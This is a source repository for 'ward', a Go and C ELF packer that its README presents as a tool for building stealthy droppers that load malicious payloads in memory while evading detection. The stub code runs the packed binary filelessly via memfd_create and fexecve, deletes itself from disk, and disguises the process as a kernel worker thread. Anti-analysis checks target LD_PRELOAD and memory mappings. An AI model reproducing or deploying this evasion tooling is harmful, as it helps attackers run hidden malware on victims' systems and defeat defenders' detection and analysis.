Project Path: arc_gmh5225_ward_b50f5ule

Source Tree:

```txt
arc_gmh5225_ward_b50f5ule
├── LICENSE
├── Makefile
├── README.md
├── go.mod
├── go.sum
├── injector.go
├── main.go
└── stub
    ├── main.c
    ├── runtime.c
    └── runtime.h

```

`LICENSE`:

```
Copyright 2021 @ex0dus-0x

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.


```

`Makefile`:

```
CC = gcc
CFLAGS = -O2

all: cli

test:
	$(CC) $(CFLAGS) -o stub/stub stub/main.c stub/runtime.c -lelf
	rm -f stub/stub

clean:
	rm -f ward *_out

cli:
	go build .

```

`README.md`:

```md
# ward

Simple ELF runtime packer for creating stealthy droppers

## Introduction

This is a simple implementation of an ELF packer that creates stealthy droppers for loading
malicious ELFs in-memory. Useful for red teamers trying to proliferate a payload while evading
detection.

## Features

* Stealthy - payload is injected in ELF format, and loaded through `memfd`-based execution
* Zlib compression for packed executables
* Anti-tampering with code injection prevention

## How It Works

__ward__ compresses a target ELF executable and injects it into a stub program,
which uses a modified `PT_NOTE` infection technique to execute it in-memory with `memfd_create`
and `fexec`.

For instance, run __ward__ on a copy of `ls`:

```
$ ward ./ls
2021/04/14 20:26:07 Starting up ward
2021/04/14 20:26:07 Checking if valid ELF binary
2021/04/14 20:26:07 Provisioning stub program for packing
2021/04/14 20:26:07 Packing original executable into stub ./ls
2021/04/14 20:26:07 Finding PT_NOTE segment for injecting metadata
2021/04/14 20:26:07 Offset: 828304 Size: 141936
2021/04/14 20:26:07 Writing (not yet encoded) ELF to stub
2021/04/14 20:26:07 Done! Find the packed application at /home/alan/Code/ward/ls.packed
```

When you execute it now, the stub program will read the compressed executable from itself,
and create an anonymous file descriptor for execution. Once executed, the file will disappear
from the disk:

```
$ ./ls.packed
example  go.mod  go.sum  injector.go  ls  ls.packed  main.go  Makefile  README.md  stub  ward
```

## License

[MIT License](https://codemuch.tech/docs/license.txt)

```

`go.mod`:

```mod
module ward

go 1.15

require (
	github.com/Binject/debug v0.0.0-20210101210738-1b03ff50b8a5
)

```

`go.sum`:

```sum
github.com/Binject/debug v0.0.0-20210101210738-1b03ff50b8a5 h1:uks5QpWybw0NHhiHQHJUWkz6BBY0mbhG6+FRicVDP9A=
github.com/Binject/debug v0.0.0-20210101210738-1b03ff50b8a5/go.mod h1:QzgxDLY/qdKlvnbnb65eqTedhvQPbaSP2NqIbcuKvsQ=
github.com/BurntSushi/toml v0.3.1/go.mod h1:xHWCNGjB5oqiDr8zfno3MHue2Ht5sIBksp03qcyfWMU=
github.com/cpuguy83/go-md2man/v2 v2.0.0-20190314233015-f79a8a8ca69d h1:U+s90UTSYgptZMwQh2aRr3LuazLJIa+Pg3Kc1ylSYVY=
github.com/cpuguy83/go-md2man/v2 v2.0.0-20190314233015-f79a8a8ca69d/go.mod h1:maD7wRr/U5Z6m/iR4s+kqSMx2CaBsrgA7czyZG/E6dU=
github.com/pmezard/go-difflib v1.0.0/go.mod h1:iKH77koFhYxTK1pcRnkKkqfTogsbg7gZNVY4sRDYZ/4=
github.com/russross/blackfriday/v2 v2.0.1 h1:lPqVAte+HuHNfhJ/0LC98ESWRz8afy9tM/0RK8m9o+Q=
github.com/russross/blackfriday/v2 v2.0.1/go.mod h1:+Rmxgy9KzJVeS9/2gXHxylqXiyQDYRxCVz55jmeOWTM=
github.com/shurcooL/sanitized_anchor_name v1.0.0 h1:PdmoCO6wvbs+7yrJyMORt4/BmY5IYyJwS/kOiWx8mHo=
github.com/shurcooL/sanitized_anchor_name v1.0.0/go.mod h1:1NzhyTcUVG4SuEtjjoZeVRXNmyL/1OwPU0+IJeTBvfc=
gopkg.in/check.v1 v0.0.0-20161208181325-20d25e280405/go.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=
gopkg.in/yaml.v2 v2.2.3/go.mod h1:hI93XBmqTisBFMUTm0b8Fm+jr3Dg1NNxqwp+5A1VGuI=

```

`injector.go`:

```go
package main

import (
	"bytes"
	"compress/zlib"
	"errors"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"runtime"

	// extends support for mutating and writing ELFs
	"github.com/Binject/debug/elf"
)

const (
	Compiler string = "clang"
	//StubSectionName string = ".ward.protect"
)

// Helper that compiles a new stub application with `clang` to be packed.
func Provision(name string, overwrite bool, compress bool, protect bool) (*string, error) {

	// find directory to stub path in Golang package
	_, filename, _, ok := runtime.Caller(0)
	if !ok {
		return nil, errors.New("Cannot find package path to provision stub program.")
	}

	// get current path before changing to stub path
	cwd, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	// get path to stub workspace
	stubPath := filepath.Join(path.Dir(filename), "stub")
	if err := os.Chdir(stubPath); err != nil {
		return nil, err
	}

	// if overwrite is set, rewrite the original path (might be dangerous)
	var out string
	if !overwrite {
		out = filepath.Join(cwd, name+".packed")
	} else {
		out, err = filepath.Abs(name)
		if err != nil {
			return nil, err
		}
	}

	// create initial compilation command
	cmd := exec.Command(Compiler, "-o", out, "-static", "-O2", "-D_FORTIFY_SOURCE=2")

    if protect {
        cmd.Args = append(cmd.Args, "-DTAMPERPROOF")
    }

    if compress {
        cmd.Args = append(cmd.Args, "-DCOMPRESS")
    }

    cmd.Args = append(cmd.Args, "main.c", "runtime.c", "-lelf")

    if compress {
        cmd.Args = append(cmd.Args, "-lz")
    }


    log.Println("Running ", cmd.Args)

	// execute compilation routine to generate a new binary
	if err := cmd.Run(); err != nil {
		return nil, err
	}

	// go back to original work directory
	if err := os.Chdir(cwd); err != nil {
		return nil, err
	}

	// return path to newly compiled stub executable
	return &out, nil
}

// Defines an Injector object that consumes a path to a compiled stub and
// target binary and creates a protected binary.
type Injector struct {
	Filepath    string    // path to the stub host
	Offset      int64     // represents offset and filesize of stub
	StubProgram *elf.File // parsed ELF of the stub host
	Target      []byte    // parsed bytes of the target binary to protect
}

// Create a new Injector interface to provision a runtime application
func NewInjector(binpath string, stub string) (*Injector, error) {

	// read bytes from target binary path we want to protect
	targetBytes, err := ioutil.ReadFile(binpath)
	if err != nil {
		return nil, err
	}

	// open to parse filesize
	f, err := os.Stat(stub)
	if err != nil {
		return nil, err
	}
	fsize := f.Size()

	// apply zlib compression
	var buf bytes.Buffer
	writer := zlib.NewWriter(&buf)
	writer.Write(targetBytes)
	writer.Close()
	_ = buf.Bytes()

	// reopen and parse stub as ELF binary
	binary, err := elf.Open(stub)
	if err != nil {
		return nil, err
	}

	return &Injector{
		stub,
		fsize,
		binary,
		targetBytes,
	}, nil
}

/*
// Helper used to modify the state of the shstrtab section in the ELF binary with the
// new section name string.
func (inj *Injector) OverwriteSection() error {

    var newShstrtab []byte
    var overwriteOffset int64

    // store index to section string table
    for _, sec := range inj.StubProgram.Sections {
        if sec.SectionHeader.Name == ".shstrtab" {
            shstrtab, err := sec.Data()
            if err != nil {
                return err
            }

            // change section name to one with same length
            newShstrtab = bytes.Replace(shstrtab, []byte(".note.ABI-tag"), []byte(StubSectionName), 1)
            overwriteOffset = int64(sec.SectionHeader.Offset)
            break
        }
    }

    // commit back to stub ELF by reopening for writing
    tempfile, err := os.OpenFile(inj.Filepath, os.O_RDWR, 0644)
    if err != nil {
        return err
    }

    // seek to offset and write
    if _, err := tempfile.WriteAt(newShstrtab, overwriteOffset); err != nil {
        return err
    }
    tempfile.Close()
    return nil
}
*/

// Method used to inject the original host into the new stub one by using a modified
// version of the PT_NOTE infection method, where the
func (inj *Injector) InjectBinary() error {

	// we only modify p_filesz to be size of packed ELF, and p_off to be offset in current file
	log.Println("Finding PT_NOTE segment for injecting metadata")
	for _, seg := range inj.StubProgram.Progs {
		if seg.Type == elf.PT_NOTE {
			seg.Filesz = uint64(len(inj.Target))
			seg.Off = uint64(inj.Offset)
			log.Printf("Offset: %d Size: %d\n", seg.Off, seg.Filesz)
			break
		}
	}

	// append target binary to the end of the stub host
	log.Println("Writing (not yet encoded) ELF to stub")
	inj.StubProgram.InsertionEOF = inj.Target

	// get bytes from final stub state
	elfBytes, err := inj.StubProgram.Bytes()
	if err != nil {
		return nil
	}
	inj.StubProgram.Close()

	// overwrite original stub with changes in ELF format
	f, err := os.OpenFile(inj.Filepath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
	if err != nil {
		return err
	}

	f.Write(elfBytes)
	f.Close()
	return nil
}

```

`main.go`:

```go
package main

import (
	"debug/elf"
	"errors"
	"flag"
	"log"
	"os"
)

func RunWard() error {
	overwrite := flag.Bool("overwrite", false, "If set, overwrite original executable path (NOT RECOMMENDED)")
    compress := flag.Bool("compress", true, "If set, compress executable when packing with zlib  (default is set)")
    protect := flag.Bool("protect", true, "If set, incorporate code injection prevention for anti-tampering against the sample (default is set)")

	flag.Parse()

	args := flag.Args()
	if len(args) != 1 {
		return errors.New("Specify a single ELF binary for packing.")
	}
	binary := args[0]
	log.Println("Starting ward to pack", binary)

	_, err := os.Stat(binary)
	if os.IsNotExist(err) {
		return errors.New("ELF file not found at path.")
	}

	log.Println("Checking if valid ELF binary")
	if _, err := elf.Open(binary); err != nil {
		return errors.New("Cannot open and parse target as ELF binary.")
	}

	log.Println("Provisioning stub program for packing")
	protector, err := Provision(binary, *overwrite, *compress, *protect)
	if err != nil {
		return err
	}

	log.Println("Packing original executable into stub", binary)
	injector, err := NewInjector(binary, *protector)
	if err != nil {
		return err
	}

	injector.InjectBinary()
	log.Println("Done! Find the packed application at", *protector)
	return nil
}

func main() {
	if err := RunWard(); err != nil {
		log.Fatal(err)
	}
}

```

`stub/main.c`:

```c
/*
 * stub.c
 * ===============
 * Implementation of an application that implements self-protection techniques,
 * while unpacking the original executable and executing it filelessly.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#include <sys/types.h>
#include <sys/mman.h>

#include <libelf.h>
#include <gelf.h>

#ifdef COMPRESS
#include <zlib.h>
#endif

#include "runtime.h"

#define TEMPFILE "[kworker/1:1]"
#define MIN(x, y) x > y ? y : x

/* helper method to exit with message */
static void die(int res, const char *msg)
{
    fprintf(stderr, "Error: %s\n", msg);
    exit(res);
}


/* safely write buffer to a given input file descriptor */
static void write_fd(int fd, const char *str, size_t len)
{
    size_t cnt = 0;
    do {
        ssize_t result = write(fd, str + cnt, MIN(len - cnt, 0x7ffff000));
        if (result == -1)
            die(-1, "writing to memfd failed");
        cnt += result;
    } while (cnt != len);
}

/* handles anti-tampering checks before entry point */
#ifdef TAMPERPROOF
void __attribute__ ((constructor)) premain()
{
    if (check_preloading() || check_mmaps())
        die(-1, "tampering through code injection detected");
}
#endif

int main(int argc, char *argv[], char *envp[])
{
    int fd;
    Elf *e;

    // open ourselves for reading
    if ((fd = open(argv[0], O_RDONLY, 0)) < 0)
        die(-1, "cannot read ourselves as file");

    // check if valid binary version
    if (elf_version(EV_CURRENT) == EV_NONE)
        die(-1, elf_errmsg(-1));

    // check if ELF magic number is present
    if ((e = elf_begin(fd, ELF_C_READ, NULL)) == NULL)
        die(-1, elf_errmsg(-1));

    // parse out number of program headers
    size_t n;
    int ret = elf_getphdrnum(e, &n);
    if (ret != 0)
        die(-1, "cannot parse any program headers");
    
    // get the first PT_NOTE segment we find
    GElf_Phdr* phdr = NULL;
    for (size_t i = 0; i < n; i++) {
        GElf_Phdr tmp;
        if (!gelf_getphdr(e, i, &tmp))
            die(-1, "cannot get program header");

        if (tmp.p_type == PT_NOTE) {
            phdr = &tmp;
            break;
        }
    }

    if (!phdr)
        die(-1, "cannot find PT_NOTE segment to further parse");

    // get attributes for PT_NOTE segment
    Elf64_Off offset = phdr->p_offset;
    Elf64_Xword size = phdr->p_filesz;

    // read packed executable from file offset
    char data[size];
    lseek(fd, 0, SEEK_SET);
    lseek(fd, offset, SEEK_SET);
    pread(fd, (void*) data, size, offset);

    close(fd);

#ifdef COMPRESS
    // decompress the data parsed
    Byte *uncompressed;
    uLong len;
#endif

    // create anonymous file
    fd = memfd_create(TEMPFILE, 0);
    if (fd == -1)
        die(fd, "cannot create in-memory fd for code");

    // delete ourselves
    if (remove(argv[0]) != 0)
        die(fd, "cannot remove self");

    // write ELF data to in memory fd and execute
    write_fd(fd, data, size - 1);
    {
        //const char *args[] = {TEMPFILE, NULL};
        argv[0] = TEMPFILE;
        fexecve(fd, (char * const *) argv, (char * const *) envp);
    }
    close(fd);
    return 0;
}

```

`stub/runtime.c`:

```c
/* runtime.c
 * ==============
 * Implements no-stdlib code injection checks to prevent executable from being traced.
 */
#include <fcntl.h>
#include <stdio.h>

#include "runtime.h"

/* static helper clone for str substitution */
static char* afterSubstr(char *str, const char *sub)
{
    int i, found;
    char *ptr;
    found = 0;
    for (ptr = str; *ptr != '\0'; ptr++)
    {
        found = 1;
        for(i = 0; found == 1 && sub[i] != '\0'; i++)
            if(sub[i] != ptr[i])
                found = 0;
        if(found == 1)
            break;
    }
    if (found == 0)
        return NULL;
    return ptr + i;
}


/* static helper for checking libc */
static int isLib(char *str, const char *lib)
{
    int i, found;
    static const char *end = ".so\n";
    char *ptr;

    // Trying to find lib in str
    ptr = afterSubstr(str, lib);
    if (ptr == NULL)
        return 0;

    // Should be followed by a '-'
    if (*ptr != '-')
        return 0;

    // Checking the first [0-9]+\.
    found = 0;
    for (ptr += 1; *ptr >= '0' && *ptr <= '9'; ptr++)
        found = 1;
    if (found == 0 || *ptr != '.')
        return 0;

    // Checking the second [0-9]+
    found = 0;
    for (ptr += 1; *ptr >= '0' && *ptr <= '9'; ptr++)
        found = 1;
    if (found == 0)
        return 0;

    // Checking if it ends with ".so\n"
    for (i = 0; end[i] != '\0'; i++)
        if (end[i] != ptr[i])
            return 0;

    return 1;
}


/* stops any attempts to utilize the `LD_PRELOAD` envvar */
int check_preloading(void)
{
    long i, j;
    char env[] = "LD_PRELOAD";

    for (i = 0; environ[i]; i++) {

        // check each char until we reach the null pointer
        for (j = 0; environ[j] != '\0' && environ[i][j] != '\0'; j++) {
            if (env[j] != environ[i][j])
                break;
        }

        // detected if every char matched
        if (env[j] == '\0')
            return 1;
    }
    return 0;
}

/* introspect the running PID's memory mappings for unwarranted libraries */
int check_mmaps(void)
{
    // stores result of execution
    char buffer[BUF_SIZE];

    // set after encounter libc shared object
    int after_libc = 0;

    // attempt opening proc mappings for current pid
    FILE *mmap;
    mmap = fopen("/proc/self/maps", "r");
    if (mmap == NULL) {
        return -1;
    }

    // iteratively read BUF_SIZE from mmap file
    while (fgets(buffer, BUF_SIZE, mmap) != NULL)
    {
        // check if libc so entry is found and set flag
        if (isLib(buffer, "libc"))
            after_libc = 1;

        // break once we reach ld entry
        if (isLib(buffer, "ld"))
            break;

        // check if not anonymous mapping
        if (after_libc && (afterSubstr(buffer, "00000000 00:00 0")  == NULL)) {
            return -1;
        }
    }
    return 0;
}

```

`stub/runtime.h`:

```h
#ifndef RUNTIME_H
#define RUNTIME_H

#define BUF_SIZE 2048

extern char **environ;

/* anti-tampering: check if LD_PRELOAD envvar is set */
int check_preloading(void);

/* anti-tampering: check if other executable code is mmapped */
int check_mmaps(void);

#endif

```